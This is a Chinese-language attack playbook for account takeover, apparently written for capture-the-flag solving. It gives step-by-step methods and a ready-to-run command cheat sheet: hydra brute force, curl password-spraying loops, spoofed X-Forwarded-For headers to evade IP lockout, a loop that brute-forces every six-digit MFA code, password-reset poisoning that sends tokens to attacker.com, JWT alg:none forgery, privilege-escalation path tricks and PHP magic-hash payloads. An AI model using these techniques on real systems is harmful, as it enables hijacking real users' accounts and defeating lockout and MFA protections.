# 账户接管与认证绕过链手册

适用题型（命中即召回本手册）：账户接管 账号接管 account-takeover 认证绕过 口令爆破 密码喷射 password-spraying 凭据填充 credential-stuffing 双因素 验证码 MFA 密码重置 重置令牌 forgot-password 会话固定 session-fixation 会话劫持 session-hijacking cookie 函数级越权 弱类型 type-juggling magic-hash loose-comparison

## 1. 识别与分类
- 题面含登录/注册/找回密码/OTP/MFA/会话/Cookie/越权/弱类型等字样即命中本手册，目标定位在"登录后的整条接管链"。
- 有用户体系（登录+注册+找回）先枚举账号，再按"爆破→重置→会话→越权"排攻击面。
- 响应头 `X-Powered-By: PHP`、`*.php` 后缀、ThinkPHP/Laravel/Flask 指纹，且登录/签名逻辑用 `==` 比较 → 弱类型高概率。
- 账号存在/不存在的文案、状态码、时延有差异 → 可枚举，是爆破与投毒的前置情报。
- 技术栈指纹选主攻方向：PHP/ThinkPHP/Laravel 偏弱类型；Java/Spring 偏 BFLA 与路径变体；Flask/Node 偏会话与签名伪造。

## 2. 攻击方法论
1. 账号枚举：登录/注册/找回三接口对比错误文案（"用户不存在"vs"密码错误"）、状态码（200 vs 401）、时延（无查库快 vs 查库+bcrypt 慢）。
2. 测锁定再爆破：先连错 5-10 次后用正确密码试登录，仍被拒=有锁定；无锁定直接 `hydra -L u.txt -P p.txt TARGET http-post-form "/login:u=^USER^&p=^PASS^:F=失败"`。
3. 密码喷射（一密多号，单号不触发锁定）：`while read u; do curl -d "u=$u&p=Password1" -s -o /dev/null -w "$u %{http_code}\n"; sleep 2; done < u.txt`；高频弱口令 Password1/Season+Year/公司名+1。
4. 凭据填充：有泄露库时 `ffuf -mode clusterbomb` 或 `hydra -C creds.txt`，命中 token/跳转即成功。
5. IP 锁定绕过：`-H "X-Forwarded-For: 10.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"` 每请求换，配 UA 轮换 + 随机延迟 2-8s。
6. OTP/MFA 绕过：密码通过后不改 code 直接 `GET /dashboard /admin /api/v2/profile`（跳步）；同 code 重放；4-6 位码无频率限制时爆破；篡改响应 `mfa_verified:false→true`。
7. 密码重置缺陷：抓 3 个 token 对比模式（时间戳/md5(email)/自增/短码=可预测）；`Host:`/`X-Forwarded-Host:` 投毒使重置链接指向攻击域偷 token；验 token 是否过期/复用/未绑用户/回显在响应体。
8. 会话固定与劫持：登录前后、提权前后、退出后 diff `Set-Cookie`——不变=固定/不失效；session 熵低（base64(uid+ts)/自增）→ 遍历相邻值劫持。
9. Cookie 伪造：JWT `alg:none` 或弱密钥（secret/key/jwt_secret）重签；弱 HMAC；`base64(uid+role)` 无签名直接改身份字段。
10. 函数级越权(BFLA)：普通账号 token 重放 admin 端点；同 URL 换方法（POST/PUT/DELETE 常漏鉴权）、大小写/`../`/`%2f` 路径变体、参数 `role=admin&isAdmin=true`。
11. PHP 弱类型：magic-hash（`240610708`/`QNKCDZO`/`aabg7XSs`）；`password[]=x` 使 strcmp 返 NULL==0；JSON 传 `true/0/null`；`==` 数字串截断（`123a`==123）。

## 3. 变体与绕过
- 验证码：删参数/传空/复用旧值/换 Content-Type(JSON)/重放同会话码，先证"服务端是否真校验"。
- 多因素旁路：API v1 有 MFA、v2/v3 无；OAuth/SSO 登录路径常跳过 MFA；backup code 8 位纯数字可爆破。
- 无回显/盲打：时延差异判账号；重置投毒用可控域收访问日志；token 猜测靠 302 跳转差异。
- 边界：PHP8 起 `0=="foo"` 为 false（老 payload 失效，先探版本）；bcrypt 72 字节截断（>72B 只比前 72B）；TOTP 30s 前后窗口可能都接受；重置并发竞态可产同 token。
- 过滤：全角/大小写/注释绕过关键字黑名单；参数重复 `email=victim&email=attacker` 做参数污染。

## 战法要点
- 先枚举账号再定爆破/投毒路线，无账号列表就用注册接口撞存在性。
- 爆破前必测锁定策略，否则白费额度；有锁定即转一密多号喷射。
- 有 MFA 先试"密码通过后直跳目标页"，比爆破验证码便宜一个数量级。
- 重置 token 抓 3 个对比模式，可预测（时间戳/md5/自增）即秒杀整条链路。
- 登录/提权/退出前后 session 不变 = 固定或不失效，直接重放旧会话。
- PHP 后端先丢 magic-hash/数组/JSON 布尔三连，成本最低回报最高。
- 登录绕不过就横移未授权接口（actuator/swagger/api/v*），别死磕表单。
- 每个命中点追问"还有没有更高危链路"：重置→接管→越权→读 flag。

## 速查清单
```text
# 账号枚举
curl -s -d 'email=X' /forgot | 对比文案/状态码/时延
# 表单爆破
hydra -L u.txt -P p.txt TARGET http-post-form "/login:u=^USER^&p=^PASS^:F=失败"
# 密码喷射（一密多号）
while read u; do curl -d "u=$u&p=Password1" -s -o /dev/null -w "$u %{http_code}\n"; sleep 2; done < u.txt
# IP 轮换
-H "X-Forwarded-For: 10.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"
# MFA 跳步：密码对后不改 code
GET /dashboard  /admin  /api/v2/profile
# MFA 爆破（无频率限制）
for c in $(seq -w 0 999999); do curl -d "code=$c" -s -o /dev/null -w "%{http_code}\n" & done
# 重置投毒
curl -H "Host: attacker.com" -d "email=victim" /forgot    # 或 X-Forwarded-Host
# 重置 token 猜测
md5(email) | 时间戳 | 自增 | base64(uid+ts) | 4-6 位数字
# token 过期/复用测试：完成重置后再用旧 token 试一次
# 会话固定/劫持
登录前后 diff Set-Cookie；不变→重放旧会话
# Cookie 伪造
JWT alg:none | HMAC 弱密钥 secret/key | base64(uid+role) 无签名
# BFLA 越权
curl -X POST /api/admin/users -H "Authorization: Bearer $TOKEN"
换方法/大小写/../ /%2f 路径变体 | ?role=admin&isAdmin=true
# PHP 弱类型
password=240610708 | QNKCDZO | aabg7XSs | 0 | null | password[]=x | {"password":true}
```
